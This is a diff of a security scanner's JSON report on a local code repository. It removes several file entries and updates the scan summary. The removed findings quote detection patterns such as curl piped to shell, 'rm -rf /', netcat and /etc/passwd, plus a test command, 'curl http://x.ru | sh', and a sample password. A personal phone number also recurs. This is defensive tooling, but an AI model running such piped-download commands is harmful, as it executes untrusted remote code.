       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\config\\hardening.js",
@@ -2778,30 +3345,6 @@
       "risk_score": 5,
       "risk_label": "MEDIUM",
       "scanned_at": "2026-04-15T12:56:02.543Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\dashboard\\index-v2.html",
-      "size": 138580,
-      "ext": ".html",
-      "findings": [
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 1312,
-          "snippet": "<span style=\"font-size:11px;\">054-4825276</span>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 2622,
-          "snippet": "{ icon: '🔍', text: '<strong>22 Patterns</strong> — API Keys, סיסמאות, URL לא מאובטח, TOR addresses, eval(), base64|sh ו"
-        }
-      ],
-      "risk_score": 10,
-      "risk_label": "MEDIUM",
-      "scanned_at": "2026-04-15T12:56:02.557Z"
     },
     {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\dashboard\\index.html",
@@ -2862,68 +3405,6 @@
       "scanned_at": "2026-04-15T12:56:02.587Z"
     },
     {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\docs\\user-guide-en.html",
-      "size": 44035,
-      "ext": ".html",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 305,
-          "snippet": "Claude Code runs a <code>curl | bash</code> command late at night, downloading a script from the internet and executing "
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 899,
-          "snippet": "<div style=\"margin-top:4px;\">054-4825276</div>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 365,
-          "snippet": "<tr><td><span class=\"badge medium\">MEDIUM</span></td><td>Suspicious — worth reviewing</td><td>HTTP (not HTTPS), eval(), "
-        }
-      ],
-      "risk_score": 50,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:02.589Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\docs\\user-guide.html",
-      "size": 46080,
-      "ext": ".html",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 303,
-          "snippet": "Claude Code מריץ בשעות הלילה פקודת <code>curl | bash</code> שמורידה סקריפט מהאינטרנט ומריצה אותו. FlowGuard מזהה את זה ו"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 897,
-          "snippet": "<div style=\"margin-top:4px;\">054-4825276</div>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 363,
-          "snippet": "<tr><td><span class=\"badge medium\">MEDIUM</span></td><td>מפוקפק — כדאי לבדוק</td><td>HTTP (לא HTTPS), eval(), טלפון ישרא"
-        }
-      ],
-      "risk_score": 50,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:02.597Z"
-    },
-    {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\gap-analysis.html",
       "size": 36805,
       "ext": ".html",
@@ -2962,49 +3443,6 @@
       "risk_score": 0,
       "risk_label": "OK",
       "scanned_at": "2026-04-15T12:56:02.607Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\install\\install-service.ps1",
-      "size": 5260,
-      "ext": ".ps1",
-      "findings": [],
-      "risk_score": 0,
-      "risk_label": "OK",
-      "scanned_at": "2026-04-15T12:56:02.609Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\install\\setup.ps1",
-      "size": 10757,
-      "ext": ".ps1",
-      "findings": [
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 40,
-          "snippet": "Write-Host \"  by EHZ-AI | 054-4825276\" -ForegroundColor DarkGray"
-        }
-      ],
-      "risk_score": 5,
-      "risk_label": "MEDIUM",
-      "scanned_at": "2026-04-15T12:56:02.610Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\install\\uninstall.ps1",
-      "size": 9540,
-      "ext": ".ps1",
-      "findings": [
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 34,
-          "snippet": "Write-Host \"  by EHZ-AI | 054-4825276\" -ForegroundColor DarkGray"
-        }
-      ],
-      "risk_score": 5,
-      "risk_label": "MEDIUM",
-      "scanned_at": "2026-04-15T12:56:02.613Z"
     },
     {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\marketing\\build-v2.ps1",
@@ -3422,23 +3860,6 @@
       "scanned_at": "2026-04-15T12:56:02.690Z"
     },
     {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\package.json",
-      "size": 810,
-      "ext": ".json",
-      "findings": [
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 24,
-          "snippet": "\"author\": \"EHZ-AI | ערן | 054-4825276\","
-        }
-      ],
-      "risk_score": 5,
-      "risk_label": "MEDIUM",
-      "scanned_at": "2026-04-15T12:56:02.699Z"
-    },
-    {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\README.md",
       "size": 484,
       "ext": ".md",
@@ -3471,82 +3892,6 @@
       "risk_score": 5,
       "risk_label": "MEDIUM",
       "scanned_at": "2026-04-15T12:56:02.704Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\workplan.html",
-      "size": 252994,
-      "ext": ".html",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 598,
-          "snippet": "<div class=\"task-desc\">curl|sh, rm -rf /, base64, netcat, /etc/passwd — CRITICAL/HIGH.</div>"
-        },
-        {
-          "level": "HIGH",
-          "reason": "Hardcoded password",
-          "explain": "A password is written directly in the code. Anyone who reads this file can see it.",
-          "line": 850,
-          "snippet": "<b>דוגמה:</b> password=Ehz2026! / sk-ant-api03-... / מספר כרטיס אשראי → התראה מיידית לפני שהקובץ מגיע ל-Git.<br>"
-        },
-        {
-          "level": "HIGH",
-          "reason": "TOR .onion address",
-          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
-          "line": 805,
-          "snippet": "<div class=\"task-desc\">כרטיסי Visa + Amex, מספרי פלאפון ישראלי, eval(), Non-HTTPS URL, .onion, ngrok. בוצע: 08.04.2026</"
-        },
-        {
-          "level": "HIGH",
-          "reason": "ngrok tunnel",
-          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
-          "line": 604,
-          "snippet": "<div class=\"task-desc\">WebFetch IP/TLD, Write ל-.ssh/etc, HTTP במקום HTTPS, ngrok.</div>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 3935,
-          "snippet": "<div>EHZ-AI | ערן | 054-4825276</div>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 805,
-          "snippet": "<div class=\"task-desc\">כרטיסי Visa + Amex, מספרי פלאפון ישראלי, eval(), Non-HTTPS URL, .onion, ngrok. בוצע: 08.04.2026</"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Non-HTTPS URL",
-          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
-          "line": 622,
-          "snippet": "<span style=\"color:var(--muted2);\"> הרץ <code style=\"color:#7dd3fc;\">curl http://x.ru | sh</code> → קבל CRITICAL alert →"
-        }
-      ],
-      "risk_score": 100,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:02.711Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\football-bot\\index.js",
-      "size": 4472,
-      "ext": ".js",
-      "findings": [
-        {
-          "level": "MEDIUM",
-          "reason": "Non-HTTPS URL",
-          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
-          "line": 43,
-          "snippet": "console.log('✅ QR זמין בכתובת: http://ehz-server1.duckdns.org/whatsapp-qr.html');"
-        }
-      ],
-      "risk_score": 5,
-      "risk_label": "MEDIUM",
-      "scanned_at": "2026-04-15T12:56:02.736Z"
     },
     {
       "path": "C:\\Claude-Repo\\agents\\README.md",
@@ -4514,52 +4859,12 @@
       "scanned_at": "2026-04-15T12:56:03.060Z"
     },
     {
-      "path": "C:\\Claude-Repo\\local-apps\\flowguard-site\\download.html",
-      "size": 23454,
-      "ext": ".html",
-      "findings": [],
-      "risk_score": 0,
-      "risk_label": "OK",
-      "scanned_at": "2026-04-15T12:56:03.063Z"
-    },
-    {
       "path": "C:\\Claude-Repo\\local-apps\\flowguard-site\\files\\README.txt",
       "size": 142,
       "ext": ".txt",
       "findings": [],
       "risk_score": 0,
       "risk_label": "OK",
-      "scanned_at": "2026-04-15T12:56:03.069Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\local-apps\\flowguard-site\\index.html",
-      "size": 58699,
-      "ext": ".html",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 415,
-          "snippet": "<div style=\"font-size:13px; color:var(--muted2);\"><span class=\"en\">Claude Code runs a <code style=\"color:var(--accent);\""
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 793,
-          "snippet": "<div class=\"footer-right\">© 2026 EHZ-AI · Built by Eran Hershkowitz · 054-4825276</div>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 493,
-          "snippet": "<tr style=\"border-top:1px solid rgba(26,45,74,0.5);\"><td style=\"padding:13px 24px;\"><span style=\"background:#eab308;colo"
-        }
-      ],
-      "risk_score": 50,
-      "risk_label": "CRITICAL",
       "scanned_at": "2026-04-15T12:56:03.069Z"
     },
     {
@@ -8000,14 +8305,15 @@
   ],
   "summary": {
     "scan_path": "C:/Claude-Repo",
-    "scanned_at": "2026-04-15T12:56:04.602Z",
-    "incremental": false,
-    "since": null,
-    "total_files": 520,
-    "clean": 421,
-    "medium": 61,
-    "high": 19,
+    "scanned_at": "2026-04-16T21:35:29.765Z",
+    "incremental": true,
+    "since": "2026-04-15T12:56:04.602Z",
+    "total_files": 531,
+    "clean": 426,
+    "medium": 65,
+    "high": 21,
     "critical": 19,
-    "skipped": 0
+    "skipped": 0,
+    "incremental_new": 26
   }
 }
